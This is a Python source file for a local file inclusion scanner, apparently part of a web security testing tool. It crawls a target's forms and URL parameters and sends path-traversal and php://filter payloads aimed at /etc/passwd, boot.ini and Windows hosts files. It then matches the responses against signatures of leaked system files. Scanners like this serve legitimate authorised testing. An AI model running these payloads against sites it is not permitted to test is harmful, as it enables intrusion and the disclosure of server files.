import re
import urllib.parse
import requests
from bs4 import BeautifulSoup
from typing import Dict, Any, List, Optional, Set
from concurrent.futures import ThreadPoolExecutor
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException, WebDriverException

from app.scanners.base_scanner import BaseScanner
from app.utils.browser_manager import browser_manager


class LFIScanner(BaseScanner):
    """
    Scanner to detect Local File Inclusion (LFI) vulnerabilities
    """

    name = "LFI Scanner"
    description = "Detects Local File Inclusion vulnerabilities"

    LFI_PAYLOADS = [
        "../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../etc/passwd%00",
        "..%2fetc%2fpasswd",
        "%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/resource=/etc/passwd",
        "c:\\windows\\system32\\drivers\\etc\\hosts",
        "../../../../../../../../windows/system32/drivers/etc/hosts",
        "c:\\boot.ini",
        "../../../../../../../../boot.ini",
    ]

    SUCCESS_PATTERNS = [
        r"root:.*:0:0:",
        r"\[boot loader\]",
        r"for 16-bit app support",
        r"localhost",
        r"# Copyright \(c\)",
    ]

    def __init__(self, target_url: str, cookies: Optional[str] = None):
        super().__init__(target_url, cookies)
        self.base_url = target_url
        self.vulnerable_endpoints: List[Dict[str, Any]] = []
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }

        self.session = requests.Session()
        self.max_threads = 10

        self.browser = None

        self.injectable_targets = []

    def scan(self) -> Dict[str, Any]:
        """Implementation of the abstract scan method that calls run"""
        return self.run()

    def _get_browser(self):
        """Get the shared browser instance"""
        if not self.browser:
            self.browser = browser_manager.get_browser()
        return self.browser

    def run(self) -> Dict[str, Any]:
        """Run LFI scan using the injectable targets provided by coordinator"""
        self.progress = 10

        if self.cookies:
            self._set_cookies()

        try:
            self.progress = 20

            if self.injectable_targets:
                self.logger.info(
                    f"Using {len(self.injectable_targets)} targets provided by coordinator"
                )

                params = self._prepare_injectable_params()
            else:

                self.logger.info("No targets from coordinator, finding parameters")
                params = self._find_parameters()

            self.progress = 30

            if params:
                self._test_parameters(params)

            self.progress = 100

            return {"vulnerable_endpoints": self.vulnerable_endpoints}

        except Exception as e:
            self.logger.error(f"Error in LFI scan: {e}")
            return {"error": str(e), "vulnerable_endpoints": self.vulnerable_endpoints}

    def _prepare_injectable_params(self) -> List[Dict[str, Any]]:
        """Transform coordinator-provided targets into the format expected by _test_parameters"""
        injectable_params = []

        try:
            for target in self.injectable_targets:
                url = target.get("url", "")
                method = target.get("method", "get").lower()

                params = target.get("params", {})
                if isinstance(params, list):

                    param_dict = {}
                    for param_name in params:
                        param_dict[param_name] = "index.php"
                    params = param_dict

                if params:
                    injectable_params.append(
                        {"url": url, "method": method, "params": params}
                    )

            return injectable_params

        except Exception as e:
            self.logger.error(f"Error preparing injectable parameters: {e}")
            return []

    def _set_cookies(self):
        """Set cookies in both session and browser"""
        if not self.cookies:
            return

        cookie_pairs = self.cookies.split(";")
        for cookie_pair in cookie_pairs:
            if "=" in cookie_pair:
                name, value = cookie_pair.strip().split("=", 1)
                self.session.cookies.set(name, value)

        browser = self._get_browser()
        try:

            browser_manager.safe_get(self.base_url)

            for cookie_pair in cookie_pairs:
                if "=" in cookie_pair:
                    name, value = cookie_pair.strip().split("=", 1)
                    browser.add_cookie(
                        {
                            "name": name,
                            "value": value,
                            "domain": urllib.parse.urlparse(self.base_url).netloc,
                        }
                    )
        except Exception as e:
            self.logger.error(f"Error setting browser cookies: {e}")

    def _find_parameters(self) -> List[Dict[str, Any]]:
        """Find potential URL parameters that could be vulnerable to LFI using browser"""
        potential_params = []

        try:

            browser = self._get_browser()
            success = browser_manager.safe_get(self.base_url)

            if not success:
                self.logger.warning(
                    f"Failed to load {self.base_url} in browser, falling back to requests"
                )

                response = self.session.get(
                    self.base_url, headers=self.headers, timeout=10
                )
                html_content = response.text
            else:
                html_content = browser.page_source

            soup = BeautifulSoup(html_content, "html.parser")

            for form in soup.find_all("form"):
                form_action = form.get("action", "")
                form_method = form.get("method", "get").lower()
                form_url = urllib.parse.urljoin(self.base_url, form_action)

                inputs = {}
                for input_tag in form.find_all("input"):
                    input_name = input_tag.get("name")
                    input_value = input_tag.get("value", "")
                    if input_name:
                        inputs[input_name] = input_value

                if inputs:
                    potential_params.append(
                        {"url": form_url, "method": form_method, "params": inputs}
                    )

            for link in soup.find_all("a", href=True):
                href = link["href"]
                parsed_url = urllib.parse.urlparse(href)

                if parsed_url.query:
                    query_params = dict(urllib.parse.parse_qsl(parsed_url.query))
                    if query_params:
                        full_url = urllib.parse.urljoin(self.base_url, href)
                        potential_params.append(
                            {
                                "url": full_url.split("?")[0],
                                "method": "get",
                                "params": query_params,
                            }
                        )

            common_params = [
                "file",
                "page",
                "path",
                "document",
                "folder",
                "root",
                "path",
                "pg",
                "style",
                "template",
            ]
            for param in common_params:
                potential_params.append(
                    {
                        "url": self.base_url,
                        "method": "get",
                        "params": {param: "index.php"},
                    }
                )

            return potential_params

        except Exception as e:
            self.logger.error(f"Error finding parameters: {e}")
            return []

    def _test_parameters(self, potential_params: List[Dict[str, Any]]):
        """Test potential parameters for LFI vulnerabilities"""
        for param_info in potential_params:
            url = param_info["url"]
            method = param_info["method"]
            params = param_info["params"]

            for param_name, param_value in params.items():
                self._test_parameter(url, method, param_name, params)

    def _test_parameter(
        self, url: str, method: str, target_param: str, all_params: Dict[str, str]
    ):
        """Test a specific parameter for LFI"""

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            test_tasks = []

            for payload in self.LFI_PAYLOADS:

                params = all_params.copy()
                params[target_param] = payload

                if method.lower() == "get":
                    test_tasks.append(
                        executor.submit(
                            self._test_payload_get, url, params, target_param, payload
                        )
                    )
                elif method.lower() == "post":
                    test_tasks.append(
                        executor.submit(
                            self._test_payload_post, url, params, target_param, payload
                        )
                    )

            completed = 0
            total = len(test_tasks)
            for task in test_tasks:
                task.result()
                completed += 1

                if total > 0:
                    self.progress = 30 + int(60 * (completed / total))

    def _test_payload_get(
        self, url: str, params: Dict[str, str], param_name: str, payload: str
    ):
        """Test a GET request with LFI payload using browser and requests"""
        try:

            browser = self._get_browser()
            try:
                full_url = f"{url}?{urllib.parse.urlencode(params)}"
                success = browser_manager.safe_get(full_url)

                if success:
                    content = browser.page_source.lower()
                    self._check_response(
                        {"text": content, "status_code": 200},
                        url,
                        "GET",
                        param_name,
                        payload,
                    )
                    return
            except (TimeoutException, WebDriverException) as e:
                self.logger.debug(
                    f"Browser error for {url}, falling back to requests: {e}"
                )

            response = self.session.get(
                url,
                params=params,
                headers=self.headers,
                timeout=10,
                allow_redirects=False,
            )
            self._check_response(response, url, "GET", param_name, payload)
        except Exception as e:
            self.logger.debug(f"Error testing payload: {e}")

    def _test_payload_post(
        self, url: str, data: Dict[str, str], param_name: str, payload: str
    ):
        """Test a POST request with LFI payload using browser and requests"""
        try:

            browser = self._get_browser()
            try:

                browser_manager.safe_get(url)

                try:
                    for field_name, field_value in data.items():
                        try:
                            input_field = browser.find_element(By.NAME, field_name)
                            input_field.clear()
                            input_field.send_keys(field_value)
                        except Exception as e:
                            self.logger.debug(f"Could not fill field {field_name}: {e}")

                    forms = browser.find_elements(By.TAG_NAME, "form")
                    if forms:
                        forms[0].submit()
                        content = browser.page_source.lower()
                        self._check_response(
                            {
                                "text": content,
                                "status_code": 200,
                            },
                            url,
                            "POST",
                            param_name,
                            payload,
                        )
                        return
                except Exception as form_ex:
                    self.logger.debug(f"Error submitting form in browser: {form_ex}")
            except (TimeoutException, WebDriverException) as e:
                self.logger.debug(
                    f"Browser error for POST to {url}, falling back to requests: {e}"
                )

            response = self.session.post(
                url, data=data, headers=self.headers, timeout=10, allow_redirects=False
            )
            self._check_response(response, url, "POST", param_name, payload)
        except Exception as e:
            self.logger.debug(f"Error testing payload: {e}")

    def _check_response(
        self, response, url: str, method: str, param_name: str, payload: str
    ):
        """Check if response indicates successful LFI"""

        if hasattr(response, "text"):
            content = response.text.lower()
        else:
            content = response["text"].lower()

        is_vulnerable = False
        for pattern in self.SUCCESS_PATTERNS:
            if re.search(pattern, content, re.IGNORECASE):
                is_vulnerable = True
                break

        if is_vulnerable:
            vulnerability = {
                "url": url,
                "method": method,
                "parameter": param_name,
                "payload": payload,
                "evidence": self._extract_evidence(content),
                "severity": "high",
            }

            if not any(
                v["url"] == url and v["parameter"] == param_name
                for v in self.vulnerable_endpoints
            ):
                self.vulnerable_endpoints.append(vulnerability)
                self.logger.warning(
                    f"Found LFI vulnerability: {url}, parameter: {param_name}"
                )

    def _extract_evidence(self, content: str) -> str:
        """Extract a snippet of evidence from the response content"""

        for pattern in self.SUCCESS_PATTERNS:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:

                start = max(0, match.start() - 50)
                end = min(len(content), match.end() + 50)
                return content[start:end]

        return content[:200] if len(content) > 200 else content
